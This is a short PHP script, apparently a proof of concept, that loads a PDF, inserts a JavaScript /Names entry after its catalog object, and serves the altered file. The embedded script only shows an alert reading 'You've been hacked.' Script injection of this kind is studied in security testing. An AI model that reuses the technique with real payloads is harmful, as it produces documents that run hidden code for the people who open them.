<?
$file = file_get_contents('./min-1.1.pdf');
$data = json_encode($_GET);
$js = <<<EOT
/Names << /JavaScript <</Names [ (EmbeddedJS) << /S /Javascript /JS (
	alert("You've been hacked.");
) >> ]  >> >>
EOT;

$file =  preg_replace(
	'#/Type\s*/Catalog#',
	'$0'.$js,
	$file
);
header('Content-Type: application/pdf');
echo $file;
?>
